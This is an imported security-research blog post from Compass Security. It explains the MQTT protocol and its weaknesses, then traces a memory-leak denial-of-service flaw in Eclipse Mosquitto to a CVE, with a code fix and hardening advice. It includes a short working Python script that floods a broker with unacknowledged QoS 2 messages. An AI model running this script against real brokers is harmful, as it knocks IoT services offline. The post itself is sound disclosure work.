---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-09-12_from-mqtt-fundamentals-to-cve.md
original_filename: 2023-09-12_from-mqtt-fundamentals-to-cve.md
title: From MQTT Fundamentals to CVE
category: documents
detected_topics:
- access-control
- otp
- oauth
- xss
- command-injection
- rate-limit
tags:
- imported
- documents
- access-control
- otp
- oauth
- xss
- command-injection
- rate-limit
language: en
raw_sha256: 6dc6e39a439e93681d74bfc6a0cdf593ee6e0dcbe2c9f3b096fe3afa271535d8
text_sha256: 4d43cccfb2af0a0b532dd95eddedc33b43a434229a5910e16468b1cb0f755f02
ingested_at: '2026-06-28T07:32:26Z'
sensitivity: unknown
redactions_applied: false
---

# From MQTT Fundamentals to CVE

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-09-12_from-mqtt-fundamentals-to-cve.md
- Source Type: markdown
- Detected Topics: access-control, otp, oauth, xss, command-injection, rate-limit
- Ingested At: 2026-06-28T07:32:26Z
- Redactions Applied: False
- Raw SHA256: `6dc6e39a439e93681d74bfc6a0cdf593ee6e0dcbe2c9f3b096fe3afa271535d8`
- Text SHA256: `4d43cccfb2af0a0b532dd95eddedc33b43a434229a5910e16468b1cb0f755f02`


## Content

---
title: "From MQTT Fundamentals to CVE"
page_title: "From MQTT Fundamentals to CVE – Compass Security Blog"
url: "https://blog.compass-security.com/2023/09/from-mqtt-fundamentals-to-cve/"
final_url: "https://blog.compass-security.com/2023/09/from-mqtt-fundamentals-to-cve/"
authors: ["Mischa Bachmann (@MischaBachmann)"]
programs: ["Eclipse Foundation"]
bugs: ["DoS", "Memory leak", "IoT", "MQTT"]
publication_date: "2023-09-12"
added_date: "2023-09-22"
source: "pentester.land/writeups.json"
original_index: 788
---

Internet of Things (IoT) and Operational Technology (OT) is an area that has grown strongly in recent years and is increasingly being used in the business world. To be able to test the security in this area, let’s take a closer look at the Message Queuing Telemetry Transport (MQTT) protocol to understand the strengths and weaknesses of the protocol. 

## MQTT Fundamentals

[![](https://blog.compass-security.com/wp-content/uploads/2023/09/image-1024x448.png)](https://blog.compass-security.com/wp-content/uploads/2023/09/image.png)

The OASIS MQTT Technical Committee (TC) aims to provide a lightweight, reliable publish and subscribe message transfer protocol suitable for communication in Machine to Machine (M2M) and Internet of Things (IoT) contexts where a small code footprint is required and/or network bandwidth is scarce. Depending on the MQTT packet type that is sent, this results in an MQTT overhead of only 2 bytes.

The protocol uses TCP/IP to transmit data over the network in an ordered, lossless, and bi-directional connection. The protocol uses the two IANA-registered ports TCP/1883 and TCP/8883 to transmit the packets unencrypted or encrypted with TLS. In addition to the two IANA-registered ports, the standard also allows the use of WebSocket’s to transmit the data, overcoming network restrictions and better integrating into existing networks as the ports TCP/80 and TCP/443 are usually open on firewalls.

### Control Packet

MQTT uses various control packets to implement the data flow. A control packet can consist of up to three parts. The fixed header, the variable header, and the payload. The fixed header occurs in every control packet and always has a length of 2 bytes. The variable header and payload occur depending on the type of control packet that is used. The variable header differs in size depending on the type, but in most cases has a length of 2 bytes. The payload as well has no fixed size. Since it can include the application data, it is usually the largest part of the MQTT control packet.

Fixed header| Variable header| Payload  
---|---|---  
2 Bytes| n Bytes| m Bytes  
  
MQTT version 3 defines 14 and version 5 defines 15 usable MQTT control packet types. The packet type is specified in the fixed header. Depending on the type, a variable header and payload are also sent. The table below shows the value sent in the fixed header, the direction in which the packet can be transmitted, and whether a variable header and payload are sent. Furthermore, in the variable header and payload columns, the information that can be transmitted is listed.

**Name******| **Value******| **Direction of flow******| **Description******| **Variable header******| **Payload******  
---|---|---|---|---|---  
Reserved|  0| Forbidden| Reserved| Reserved| Reserved  
CONNECT| 1| Client –> Server| Client request to connect to Server| Protocol Name Protocol Level Connect Flags Keep Alive| Client Identifier Will Topic Will Message User Name Password  
CONNACK| 2| Client <– Server| Connect acknowledgment| Connect Acknowledge Flags Connect Return code| None  
PUBLISH| 3| Client <–> Server| Publish message| Topic Name  
Packet Identifier (if QoS > 0)****| Application Message  
PUBACK| 4| Client <–> Server| Publish acknowledgment (if QoS = 1)| Packet Identifier| None  
PUBREC| 5| Client <–> Server| Publish received (if QoS = 2, assured delivery part 1)| Packet Identifier| None  
PUBREL| 6| Client <–> Server| Publish release (if QoS = 2, assured delivery part 2)| Packet Identifier| None  
PUBCOMP| 7| Client <–> Server| Publish complete (if QoS = 2, assured delivery part 3)| Packet Identifier| None  
SUBSCRIBE| 8| Client –> Server| Client subscribe request| Packet Identifier| Topic Filter Requested QoS  
SUBACK| 9| Client <– Server| Subscribe acknowledgment| Packet Identifier| Return Code  
UNSUBSCRIBE| 10| Client –> Server| Unsubscribe request| Packet Identifier| Topic Filter  
UNSUBACK| 11| Client <– Server| Unsubscribe acknowledgment| Packet Identifier| None  
PINGREQ| 12| Client –> Server| PING request| None| None  
PINGRESP| 13| Client <– Server| PING response| None| None  
DISCONNECT| 14| Client –> Server| Client is disconnecting| None| None  
AUTH| 15| Client <–> Server| Authentication exchange| Authenticate Reason Code  
Properties| None  
  
### Topics

Topics in MQTT are used to send and receive messages via the broker. Topics are hierarchical and similar to the principle of a file systems in the Linux operating system. This example represents a system which allows to control the state of building doors via MQTT. Two devices send their status to one of the following topics according to certain rules:

  * hq/main_entrance/door/lock
  * hq/server_room/door/lock

To receive the current door state from the door sensor of the main entrance at the headquarters, the topic hq/main_entrance/door/state is subscribed to with a SUBSCRIBE packet. As soon as the topic receives an update, the message is sent from the server to all subscribing clients.

There is also the possibility to use wildcards to subscribe to multiple topics at the same time. If a client wants to receive the value of the door lock of the sensors from the main entrance door and the server room door, it can subscribe to both topics at the same time with a SUBSCRIBE topic filter of hq/+/door/lock. The character + matches all occurring topics on this hierarchical level. If a client wants to subscribe to all topics that occur in hq, the character # can be used. In this case, the SUBSCRIBE package would include the topic filter hq/#. The character # may however only occur alone or at the end of the string at the top level. That means hq# or hq/#/door would not be valid.

### Authentication and Authorization

It is possible to have clients authenticate against the broker during the initial connection. At the protocol level the client does not authenticate the broker. Broker authentication can be implemented with TLS and certificates.

The CONNECT packet can be used to transmit the client credentials to the broker. It includes the flags User Name and Password within the variable header and the actual values within the payload. The server software can use these fields to implement authentication and authorization on the specific topics. If authentication fails, the TCP connection will be closed by the server. If authorization fails, the client won’t be able to read and/or write to specific topics.

Compared to MQTT version 3, version 5 has introduced another control packet called AUTH, which received the value 15. The packet can be sent from the client to the server or vice versa and is part of the extended authentication procedure. It allows to perform advanced authentications, such as a challenge and response procedure.

### Example of Connection Procedure

The MQTT broker is a server that listens on the IANA-registered ports and accepts connections from MQTT clients. A connection must be established from the client to the server. After a connection has been established, messages can be published or a topic subscribed to using the different control packets.

To get a better understanding of the protocol, this section shows an example of how a client establishes a connection to an MQTT broker and subscribes to a topic. The broker then sends the messages it receives from another client for that topic to each client that is subscribed to said topic. The messages in this example are all sent without any QoS flag.

[![](https://blog.compass-security.com/wp-content/uploads/2023/09/image-1.png)](https://blog.compass-security.com/wp-content/uploads/2023/09/image-1.png)

Client A sends a CONNECT packet to the broker and receives a CONNACK back from the broker as confirmation of a successful connection. In the meantime, client B publishes the temperature value 25 to the topic temperature/roof. Now client A wants to subscribe to the topic temperature/roof to receive all messages sent to this topic. The last value sent to this topic was the number 25 from client B with a PUBLISH packet. Since this message was sent with the retain flag, client A will now subsequently receive the value 25 from the broker with a PUBLISH packet. In the next step, client A publishes the value 20 for the same topic via the broker and a PUBLISH packet. If the client is not authorized to send a message to this topic this will not be stored by the broker and the message will not be sent to the subscribed clients. In the next step, client B sends the value 38 to the topic with a PUBLISH packet and this is immediately transmitted to client A with a PUBLISH packet since it is still subscribed to the topic. In the last step, client A sends a DISCONNECT packet to terminate the connection with the broker. During this entire example, client A was using a single TCP connection to send and receive any MQTT data.

## Security

The protocol was intentionally kept very simple to allow the simplest possible implementation in different environments. Consequently, the protocol lacks fundamental security mechanisms. Providing appropriate security features is left to the implementation.

The MQTT protocol offers the possibility that the client authenticates against the MQTT broker via username and password. The two fields User Name and Password are supplied in the CONNECTION payload. This allows the MQTT broker to ensure that only authenticated clients get access to the requested topics. However, it is also possible to use an external authentication solution such as the Lightweight Directory Access Protocol (LDAP) or Open Authorization (OAuth 2.0). In this case, these fields can also be used to submit a token. Alternatively, Mutual TLS (mTLS) can be used to ensure that the client and broker authenticate each other during the Transport Layer Security (TLS) handshake.

To control the authorization of clients, the MQTT broker can rely on several authentication factors, such as username, client ID, IP address or TLS certificate. In the standard, these factors are not explicitly specified and are usually provided by the used MQTT broker software. For example, an Access Control List (ACL) is commonly used.

To ensure confidentiality and integrity of data in transit, the protocol relies on encrypted communication via TLS. Other options are to establish the connection between the client and server via a protected tunnel, such as with a Virtual Private Network (VPN) or with Secure Shell Protocol (SSH) via a SOCKS proxy. There is also the possibility to cryptographically protect only certain fields in the MQTT packet like the message itself. In this case, the cryptographic operations are outsourced to the application.

Advanced security checks such as detecting a revoked certificate via Certificate Revocation List (CRL) or Online Certificate Status Protocol (OCSP) also depend on the respective implementation of the client and server software.

Also, the detection of anomalies is not part of the protocol. A few examples are given bellow.

### **Topic scanning**

Because the standard allows wildcards for subscribing to topics, a client can scan all topics that are not explicitly protected with credentials. This can lead to sensitive data being transmitted to unauthorized clients for topics that have improper ACLs set. Protection against this depends on the configuration of the broker.

### **Repeated connection attempts**

It is not a requirement to detect and block multiple repeated connection attempts. This could lead to a client establishing multiple connections to the broker and thus trying to overload the server. A protection mechanism must be provided by the broker implementation. In previous work it was demonstrated that there are different DoS attacks which can be used against a broker.

### **Repeated authentication attempts**

In the protocol specification it is not a requirement to detect and block multiple repeated authentication attempts. During this work it was found that this could lead to a client trying to brute force credentials via multiple authentication attempts and thus gaining access to protected topics. A protection mechanism against this is up to the used broker software.

### **Undefined authentication methods**

MQTT v5 has introduced new features. Since no list of authentication methods have been defined in the standard for the AUTH control packet, there will be different supported methods within the client and server software. This can be a disadvantage if certain clients do not understand and support the more secure authentication methods that the broker provides. Brokers will most likely provide less secure authentication methods to maintain compatibility with most clients. This problem will only be present in version 5 of the protocol as version 3 does not support the AUTH control packet.

### **Filling up the queue with messages**

Version 5 introduces the flow control mechanism to ensure that there is a cap on the maximum number of PUBLISH packets with a QoS of 1 or 2 that have not yet received a PUBACK (for QoS 1) or PUBCOMP (for QoS 2). In version 3 this feature can be exploited to fill up the queue with messages and render the broker unresponsive.

This was tested against the Eclipse Mosquitto broker to verify if it is possible to fill up the queue with MQTT version 3.1.1. A small python program was written that establishes a new connection to the broker, sends the first packet of a QoS 2 message and then repeats the steps. The broker will keep the message, waiting for the client to confirm it, which it never does.
  
  
  #!/usr/bin/python
  import socket
  from time import sleep
  
  # Create a socket
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  
  # Connect to a remote host
  s.connect(('10.42.0.1', 1883))
  
  # Send a message
  msg_len = '12'
  c_id_len = '0006'
  
  # CONNECT MQTT v3.1.1
  s.send(bytes.fromhex('10' + msg_len + '0004')+b'MQTT'+bytes.fromhex('04 02 003c' + c_id_len)+b'python')
  sleep(1)
  # PUBLISH QoS 2
  while True:
  s.send(bytes.fromhex('3415000c7368656c6c6965732f626d6900015445535432'))
  # Close the connection
  s.close()

The hex value represents the PUBLISH packet with QoS level 2 and was extracted from the Wireshark capture of the following command:
  
  
  $ mosquitto_pub -h 10.42.0.1 -i linux_client_commands -t shellies/bmi -q 2 -m "TEST2"

Inspecting the process of the Mosquitto server with htop shows that its memory consumption is at around 7.3 megabytes in an idle state after a fresh start:

[![](https://blog.compass-security.com/wp-content/uploads/2023/09/image-3-1024x219.png)](https://blog.compass-security.com/wp-content/uploads/2023/09/image-3.png)

After running the Python program for only 60 seconds the memory consumption had jumped up to a total of 195 megabytes:

[![](https://blog.compass-security.com/wp-content/uploads/2023/09/image-4-1024x218.png)](https://blog.compass-security.com/wp-content/uploads/2023/09/image-4.png)

Even after more than 3 hours the Mosquitto broker still holds the same amount of memory. The attack works even if the configuration options max_queued_bytes or max_queued_messages are set. Having Mosquitto configured with persistence to write data to disk does not change the behaviour of this attack. Only the memory_limit was found to block this attack as soon as the limit was reached.

Testing the same attack with MQTT v5 revealed the same issue exists in the newer implementation where the feature flow control was introduced. This indicates that there exists a memory leak weakness somewhere in the code.

The latest Mosquitto version in the Kali repositories is 2.0.11, but the latest release by the developers is 2.0.15. To perform these tests on the latest version the source code was downloaded from GitHub and compiled. To ensure this weakness is not specific to the Kali machine the tests were performed on an Ubuntu virtual machine. Testing against 2.0.15 revealed that the weakness still exists in the most recent version of Mosquitto.

Having a working DoS exploit that reliably results in a memory leak, the next step is to find the issue within the code. The assumption is that the broker allocates memory for the received PUBLISH packets but never frees them. Following our assumption, the program most likely has a leak in the heap allocation. To confirm this and to better understand where this leak is happening the tool heaptrack was used to analyse the calling functions which allocate the memory which is never freed:
  
  
  $ heaptrack src/mosquitto
  heaptrack output will be written to "/home/bmi/mqtt/mosquitto/mosquitto-2.0.15/heaptrack.mosquitto.23102.zst"
  /usr/lib/heaptrack/libheaptrack_preload.so
  starting application, this might take some time...
  1678178152: Warning: Unable to drop privileges to 'mosquitto' because this user does not exist. Trying 'nobody' instead.
  1678178152: mosquitto version 2.0.15 starting
  1678178152: Using default config.
  1678178152: Starting in local only mode. Connections will only be possible from clients running on this machine.
  1678178152: Create a configuration file which defines a listener to allow remote access.
  1678178152: For more details see https://mosquitto.org/documentation/authentication-methods/
  1678178152: Opening ipv4 listen socket on port 1883.
  1678178152: Opening ipv6 listen socket on port 1883.
  1678178152: mosquitto version 2.0.15 running

After the program is started with heaptrack the attack is run until the memory starts to rise and then the Mosquitto process is killed. Heaptrack will then write the analysis to disk and automatically start the GUI:
  
  
  1678178899: New connection from 127.0.0.1:41376 on port 1883.
  1678178899: New client connected from 127.0.0.1:41376 as python (p2, c1, k60).
  1678178909: Client python disconnected due to out of memory.
  1678178932: mosquitto version 2.0.15 terminating
  heaptrack stats:
       allocations:               11999250
       leaked allocations:        0
       temporary allocations:     663083
  Heaptrack finished! Now run the following to investigate the data:
  
    heaptrack --analyze "/home/bmi/mqtt/mosquitto/mosquitto-2.0.15/heaptrack.mosquitto.24296.zst"
  
  heaptrack_gui detected, automatically opening the file...

With the GUI it is possible to identify the different functions and the peak amount of heap they allocated during runtime. This serves as a good starting point for finding the weakness in the source code.

[![](https://blog.compass-security.com/wp-content/uploads/2023/09/image-2-1024x453.png)](https://blog.compass-security.com/wp-content/uploads/2023/09/image-2.png)

Analysing the code and debugging the program it was possible to identify the root cause of the memory leak. After the broker receives a PUBLISH packet with QoS 2 it sends a reply to the client within the net__write() function in the lib/net_mosq.c file on line 1020:
  
  
  return send(mosq->sock, buf, count, MSG_NOSIGNAL);

It uses the libc send() function to send the packet over the socket and returns the return value to the calling function of net__write(), which in this case is the packet__write() function in the lib/packet_mosq.c file. The value which is returned to the packet__write() function is the number of bytes which have been sent over the socket. If an error arises the value -1 is returned instead. On line 248 of the file lib/packet_mosq.c we can see the return value being saved in the write_length variable:
  
  
  while(packet->to_process > 0){
  write_length = net__write(mosq, &(packet->payload[packet->pos]), packet->to_process);
  if(write_length > 0){
  G_BYTES_SENT_INC(write_length);
  packet->to_process -= (uint32_t)write_length;
  packet->pos += (uint32_t)write_length;
  }
  

Debugging the program it was noticed that at around the mark of receiving 80’000 PUBLISH QoS 2 packets within a short amount of time the send() function would fail. The error code macro is EAGAIN, which stands for “Resource temporarily unavailable. The call might work if you try again later.” and the value -1 is returned.

Following the control flow of the packet__write() function shows on line 257 the error handling for the EAGAIN error. In this function lies the actual weakness. The code frees the thread mutex and returns with a MOSQ_ERR_SUCCESS, which translates to the value 0. The function packet__queue() which is calling packet__write() in this case does not have any way of knowing that the transmission of the packet has failed.

In addition, in the call stack there seems to be no logic implemented which would catch this error and try to resend, resulting in the packet being held in memory indefinitely:
  
  
  if(errno == EAGAIN || errno == COMPAT_EWOULDBLOCK
  #ifdef WIN32
  || errno == WSAENOTCONN
  #endif
  ){
  pthread_mutex_unlock(&mosq->current_out_packet_mutex);
  return MOSQ_ERR_SUCCESS;

A proper fix for this weakness would be to implement logic that apart from catching the error also tries to attempt a retransmission after a defined period. Because said error handling is missing a quick fix would be to free the memory region of the failed packet to ensure there is no memory leak in such a failed state. This can be easily achieved by replacing the return with a break:
  
  
  if(errno == EAGAIN || errno == COMPAT_EWOULDBLOCK
  #ifdef WIN32
  || errno == WSAENOTCONN
  #endif
  ){
  pthread_mutex_unlock(&mosq->current_out_packet_mutex);
  break;

This will ensure that in the case of an error the control flow breaks out of the if statement and continues to handle the rest of the code. This will lead to the functions at lines 316-319 which unlocks the mutex, cleans up the packet and releases the memory region before returning to the calling function at line 335:
  
  
          pthread_mutex_unlock(&mosq->out_packet_mutex);
  
          packet__cleanup(packet);
          mosquitto__free(packet);

Accordingly, a CVE was requested for this weakness and the developer was contacted with the security details. This vulnerability was assigned the ID CVE-2023-28366 by MITRE and an [advisory](https://www.compass-security.com/fileadmin/Research/Advisories/2023_02_CSNC-2023-001_Eclipse_Mosquitto_Memory_Leak.txt) was released. The version 2.0.16 of Eclipse Mosquitto includes a proper fix for this weakness.

## Recommendations

  * Use MQTT v5 to support newer features like flow control or authentication of the server
  * If the devices are capable use mutual TLS between devices and broker
  * Ensure authorization checks are performed after the solution has been built
  * Don’t rely only on username and password for authentication
  * Keep the broker up to date to ensure newly discovered vulnerabilities are patched
  * Ensure the broker supports security mechanism that detect attacks like repeated connections or authentications attempts or implement a solution that can detect and block such attacks
  * Make sure only authenticated access is exposed to the internet, if possible don’t expose to the internet

## References

  1. “MQTT – The Standard for IoT Messaging.” <https://mqtt.org/>
  2. “MQTT Version 3.1.1.” <http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html>
  3. “MQTT Version 5.0.” <https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html>
  4. “MQTT,” _Wikipedia_. Dec. 09, 2022. Available: [https://de.wikipedia.org/w/index.php?title=MQTT&oldid=228717191](https://de.wikipedia.org/w/index.php?title=MQTT&oldid=228717191)
  5. I. Vaccari, M. Aiello, and E. Cambiaso, “SlowITe, a Novel Denial of Service Attack Affecting MQTT,” _Sensors_ , vol. 20, no. 10, Art. no. 10, Jan. 2020, doi: 10.3390/s20102932.
  6. I. Vaccari, M. Aiello, and E. Cambiaso, “SlowTT: A Slow Denial of Service against IoT Networks,” _Information_ , vol. 11, no. 9, Art. no. 9, Sep. 2020, doi: 10.3390/info11090452.
  7. “Eclipse Mosquitto / Denial of Service, Memory Leak” <https://www.compass-security.com/fileadmin/Research/Advisories/2023_02_CSNC-2023-001_Eclipse_Mosquitto_Memory_Leak.txt>
  8. “Version 2.0.16 released. | Eclipse Mosquitto” <https://mosquitto.org/blog/2023/08/version-2-0-16-released/>
